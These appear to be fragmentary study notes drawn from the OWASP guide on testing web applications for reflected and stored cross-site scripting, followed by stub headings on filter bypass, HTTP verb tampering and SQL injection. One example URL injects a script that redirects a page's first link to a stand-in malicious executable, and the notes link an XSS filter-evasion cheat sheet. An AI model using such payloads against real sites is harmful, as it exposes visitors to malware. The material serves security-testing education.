# Testing for Reflected Cross site scripting

Reflected Cross-site Scripting (XSS) occur when an attacker in-
jects browser executable code within a single HTTP response.
The injected attack is not stored within the application itself; it is
non-persistent and only impacts users who open a maliciously
crafted link or third-party web page. The attack string is included
as part of the crafted URI or HTTP parameters, improperly pro-
cessed by the application, and returned to the victim

### How to Test
#### Black Box testing

A black-box test will include at least three phases:


[1] Detect input vectors. For each web page, the tester must de-
termine all the web application’s user-defined variables and how
to input them. This includes hidden or non-obvious inputs such
as HTTP parameters, POST data, hidden form field values, and
predefined radio or selection values. Typically in-browser HTML
editors or web proxies are used to view these hidden variables.
See the example below.

[2] Analyze each input vector to detect potential vulnerabilities.
To detect an XSS vulnerability, the tester will typically use spe-
cially crafted input data with each input vector. Such input data is
typically harmless, but trigger responses from the web browser
that manifests the vulnerability. Testing data can be generated by
using a web application fuzzer, an automated predefined list of
known attack strings, or manually.

[3] For each test input attempted in the previous phase, the tester
will analyze the result and determine if it represents a vulnera-
bility that has a realistic impact on the web application’s security.
This requires examining the resulting web page HTML and search-
ing for the test input. Once found, the tester identifies any special
characters that were not properly encoded, replaced, or filtered
out. The set of vulnerable unfiltered special characters will depend
on the context of that section of HTML.

Example 2
Let’s try other piece of code (link):
http://example.com/index.php?user=<script>window.
onload = function() {var AllLinks=document.
getElementsByTagName(“a”);
AllLinks[0].href = “http://badexample.com/malicious.exe”; }</
script>

# Bypass XSS filters

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

## Testing for Stored Cross site scripting

Stored XSS occurs when a web application gathers input from a
user which might be malicious, and then stores that input in a data
store for later use. The input that is stored is not correctly filtered.
As a consequence, the malicious data will appear to be part of the
web site and run within the user’s browser under the privileges
of the web application. Since this vulnerability typically involves
at least two requests to the application, this may also called sec-
ond-order XSS.

## How to Test
Black Box testing

Input Forms
The first step is to identify all points where user input is stored
into the back-end and then displayed by the application. Typical
examples of stored user input can be found in:

• User/Profiles page: the application allows the user to edit/
change profile details such as first name, last name, nickname,
avatar, picture, address, etc.

• Shopping cart: the application allows the user to store items
into the shopping cart which can then be reviewed later

• File Manager: application that allows upload of files

• Application settings/preferences: application that allows the
user to set preferences

• Forum/Message board: application that permits exchange of
posts among users

• Blog: if the blog application permits to users submitting
comments

• Log: if the application stores some users input into logs.


# Testing for HTTP Verb Tampering
http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2008-May/003855.html

## sql injections 

use fuzz master
